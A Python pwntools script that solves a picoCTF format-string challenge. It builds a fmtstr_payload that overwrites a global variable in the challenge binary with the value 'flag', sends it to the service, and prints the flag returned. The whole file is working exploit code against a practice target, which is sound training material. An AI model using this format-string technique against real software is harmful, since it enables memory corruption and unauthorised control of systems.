from pwn import context, remote, fmtstr_payload
from syoch_ctf.require_file import url_process

URL = "https://artifacts.picoctf.net/c_rhea/26/vuln"

context.clear(arch="amd64")
p = url_process(URL)
# p = remote("rhea.picoctf.net", 62436)

p.recvuntil(
    b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?"
)

# * Doing FSA
payload = fmtstr_payload(14, {0x404060: 0x67616C66})
print(f"Payload length: {len(payload)}")
print(f"payload: {payload}")
if len(payload) > 1024:
    print("Payload is too long")

print("Doing FSA")
p.sendline(payload)

flag = p.recvall(timeout=3)
print(flag.decode("utf-8", errors="ignore"))
